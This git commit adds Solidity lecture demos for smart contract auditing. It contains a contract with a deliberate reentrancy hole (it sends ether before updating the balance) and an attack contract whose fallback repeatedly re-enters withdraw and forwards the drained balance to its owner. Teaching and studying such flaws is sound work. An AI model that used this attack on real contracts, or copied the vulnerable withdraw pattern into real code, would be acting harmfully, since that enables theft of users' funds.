98d978b431b970dee170b8bbb3e648dd2b49e3ba
reecenee <csdzip@gmail.com>
2018-09-03 11:04:26 +0800

    add 02

---
+++ 02/0202_reentrancy_attack.sol
@@ -0,0 +1,54 @@
+pragma solidity ^0.4.24;
+
+contract ReentrancyGame {
+
+  mapping (address => uint) public credit;
+
+  event Deposit(address _who, uint value);
+  event Withdraw(address _who, uint value);
+    
+  function deposit() payable public returns (bool) {
+    credit[msg.sender] += msg.value;
+    emit Deposit(msg.sender, msg.value);
+    return true;
+  }
+    
+  function withdraw(uint amount) public returns (bool) {
+    if (credit[msg.sender]>= amount) {
+      msg.sender.call.value(amount)();
+      credit[msg.sender]-=amount;
+      emit Withdraw(msg.sender, amount);
+      return true;
+    }
+    return false;
+  }  
+
+  function creditOf(address to) public returns (uint) {
+    return credit[to];
+  }
+}
+
+contract ReentrancyAttack {
+  ReentrancyGame public regame;
+  address owner;
+
+  function ReentrancyAttack (ReentrancyGame addr) { 
+    owner = msg.sender;
+    regame = addr;
+  }
+
+  function attack() public returns (bool){
+    regame.deposit.value(1)();
+    regame.withdraw(1);
+    return true;
+  }
+  
+  function geteth() public returns (bool){ 
+    owner.transfer(this.balance); 
+    return true;
+  }
+
+  function() public{ 
+    regame.withdraw(1); 
+  }
+}
--- README.md
+++ README.md
@@ -2,5 +2,8 @@
 some smart contract demos for  audit lectures.
 
 - 01-智能合约入门
-    - [hellogame_01_1.sol](01/hellogame_01_1.sol)
-    - [erc20_01_2.sol](01/erc20_01_2.sol)
+    - [0101_hellogame.sol](01/hellogame_01_1.sol)
+    - [0102_erc20.sol](01/erc20_01_2.sol)
+- 02-重入漏洞
+    - [0201_reentrancy.sol](02/0201_reentrancy.sol)
+    - [0202_reentrancy_attack.sol](02/0202_reentrancy_attack.sol)
